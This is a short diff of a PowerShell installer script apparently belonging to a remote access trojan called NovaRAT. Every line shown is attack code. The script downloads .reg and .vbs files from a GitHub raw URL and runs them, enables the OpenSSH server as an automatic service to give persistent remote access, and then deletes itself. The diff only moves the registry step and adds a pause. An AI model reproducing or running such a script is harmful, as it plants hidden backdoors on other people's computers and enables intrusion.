@@ -47,14 +47,17 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/file
 $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
-#install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
-
 #enabling persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
+
+
+#install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
+
+pause
 
 # self delete
 cd $initial_dir
